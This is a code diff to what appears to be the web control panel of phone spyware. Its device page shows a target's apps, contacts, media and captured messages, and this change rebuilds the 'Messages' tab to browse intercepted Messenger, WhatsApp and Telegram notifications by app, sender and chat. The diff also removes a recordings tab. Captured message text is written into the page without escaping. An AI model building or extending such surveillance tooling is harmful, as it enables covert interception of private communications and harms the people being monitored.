@@ -91,6 +91,7 @@ const NotificationSchema = new mongoose.Schema({
     token: String,
     app: String,
     sender: String,
+    chat_id: { type: String, default: '' },
     message: String,
     received_at: Date
 });
@@ -708,7 +709,6 @@ app.get('/device', async (req, res) => {
             <button class="tab" onclick="showTab('contacts')">👥 Contacts</button>
             <button class="tab" onclick="showTab('media')">🖼️ Media</button>
             <button class="tab" onclick="showTab('messages')">🔔 Messages</button>
-	    <button class="tab" onclick="showTab('recordings')">🎙️ Recordings</button>
         </div>
 
         <!-- Apps Tab -->
@@ -816,21 +816,43 @@ app.get('/device', async (req, res) => {
     <img id="lightbox-img" style="max-width:90%;max-height:90%;border-radius:8px;"/>
 </div>
 
-        <!-- Instant Messages Tab -->
-        <div id="tab-messages" class="tab-content">
-            <div class="card" style="padding:0">
-                ${notifications.length === 0 ? '<p class="no-data">No instant messages captured</p>' : `
-                <table>
-                    <tr><th>App</th><th>Sender</th><th>Message</th><th>Date</th></tr>
-                    ${notifications.map(n => `<tr>
-                        <td>${n.app}</td>
-                        <td>${n.sender}</td>
-                        <td>${n.message}</td>
-                        <td>${new Date(n.received_at).toLocaleString()}</td>
-                    </tr>`).join('')}
-                </table>`}
+      <!-- Messages Tab -->
+<div id="tab-messages" class="tab-content">
+    <div class="card">
+        <!-- Level 1: App selector -->
+        <div id="msg-level-apps">
+            <h3 style="margin-bottom:16px;color:#1a1a2e">Messaging Apps</h3>
+            <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:12px">
+                ${['Messenger','WhatsApp','Telegram'].map(app => {
+                    const count = notifications.filter(n => n.app === app).length;
+                    return `<div onclick="showChats('${app}')" style="background:#f8f8f8;border-radius:10px;padding:20px;text-align:center;cursor:pointer;border:2px solid #eee" onmouseover="this.style.borderColor='#1a1a2e'" onmouseout="this.style.borderColor='#eee'">
+                        <div style="font-size:28px;margin-bottom:8px">${app === 'Messenger' ? '💬' : app === 'WhatsApp' ? '📱' : '✈️'}</div>
+                        <div style="font-weight:bold;color:#1a1a2e">${app}</div>
+                        <div style="color:#888;font-size:12px;margin-top:4px">${count} messages</div>
+                    </div>`;
+                }).join('')}
             </div>
         </div>
+
+        <!-- Level 2: Chats list -->
+        <div id="msg-level-chats" style="display:none">
+            <div style="display:flex;align-items:center;margin-bottom:16px">
+                <button class="btn" onclick="showApps()" style="background:#eee;color:#333;margin-right:12px">← Back</button>
+                <h3 id="chats-title" style="color:#1a1a2e"></h3>
+            </div>
+            <div id="chats-list"></div>
+        </div>
+
+        <!-- Level 3: Chat messages -->
+        <div id="msg-level-messages" style="display:none">
+            <div style="display:flex;align-items:center;margin-bottom:16px">
+                <button class="btn" onclick="showChatsBack()" style="background:#eee;color:#333;margin-right:12px">← Back</button>
+                <h3 id="messages-title" style="color:#1a1a2e"></h3>
+            </div>
+            <div id="messages-list"></div>
+        </div>
+    </div>
+</div>
 
     </div>
     <script>
@@ -850,6 +872,81 @@ function openLightbox(img) {
 }
 function closeLightbox() {
     document.getElementById('lightbox').style.display = 'none';
+}
+
+// Messages navigation
+const allNotifications = ${JSON.stringify(notifications)};
+let currentApp = '';
+
+function showApps() {
+    document.getElementById('msg-level-apps').style.display = 'block';
+    document.getElementById('msg-level-chats').style.display = 'none';
+    document.getElementById('msg-level-messages').style.display = 'none';
+}
+
+function showChats(app) {
+    currentApp = app;
+    document.getElementById('msg-level-apps').style.display = 'none';
+    document.getElementById('msg-level-chats').style.display = 'block';
+    document.getElementById('msg-level-messages').style.display = 'none';
+    document.getElementById('chats-title').textContent = app + ' - Chats';
+
+    // Get unique senders for this app
+    const appMessages = allNotifications.filter(n => n.app === app);
+    const senders = [...new Set(appMessages.map(n => n.sender))];
+
+    const list = document.getElementById('chats-list');
+    if (senders.length === 0) {
+        list.innerHTML = '<p class="no-data">No chats found</p>';
+        return;
+    }
+
+    list.innerHTML = senders.map(sender => {
+        const msgs = appMessages.filter(n => n.sender === sender);
+        const latest = msgs[0];
+        return `<div onclick="showMessages('${sender.replace(/'/g, "\\'")}')" 
+            style="padding:14px;border-bottom:1px solid #eee;cursor:pointer;display:flex;justify-content:space-between;align-items:center"
+            onmouseover="this.style.background='#f9f9f9'" onmouseout="this.style.background=''">
+            <div>
+                <div style="font-weight:bold;color:#1a1a2e">${sender}</div>
+                <div style="color:#888;font-size:12px;margin-top:2px">${latest?.message?.substring(0,50) || ''}...</div>
+            </div>
+            <div style="text-align:right;flex-shrink:0;margin-left:12px">
+                <div style="color:#888;font-size:11px">${latest ? new Date(latest.received_at).toLocaleString() : ''}</div>
+                <div style="background:#1a1a2e;color:white;border-radius:10px;padding:2px 8px;font-size:11px;margin-top:4px">${msgs.length} msgs</div>
+            </div>
+        </div>`;
+    }).join('');
+}
+
+function showChatsBack() {
+    document.getElementById('msg-level-chats').style.display = 'block';
+    document.getElementById('msg-level-messages').style.display = 'none';
+}
+
+function showMessages(sender) {
+    document.getElementById('msg-level-chats').style.display = 'none';
+    document.getElementById('msg-level-messages').style.display = 'block';
+    document.getElementById('messages-title').textContent = sender;
+
+    const msgs = allNotifications
+        .filter(n => n.app === currentApp && n.sender === sender)
+        .sort((a, b) => new Date(a.received_at) - new Date(b.received_at));
+
+    const list = document.getElementById('messages-list');
+    list.innerHTML = msgs.map(m => `
+        <div style="padding:10px 14px;border-bottom:1px solid #eee">
+            <div style="display:flex;justify-content:space-between;align-items:flex-start">
+                <div style="background:#f0f2ff;border-radius:8px;padding:8px 12px;max-width:75%">
+                    <div style="color:#1a1a2e;font-size:14px">${m.message}</div>
+                </div>
+                <div style="color:#888;font-size:11px;margin-left:8px;flex-shrink:0">${new Date(m.received_at).toLocaleString()}</div>
+            </div>
+        </div>
+    `).join('');
+
+    // Scroll to bottom
+    list.scrollTop = list.scrollHeight;
 }
 
 async function requestDownload(token, filename, image_id) {
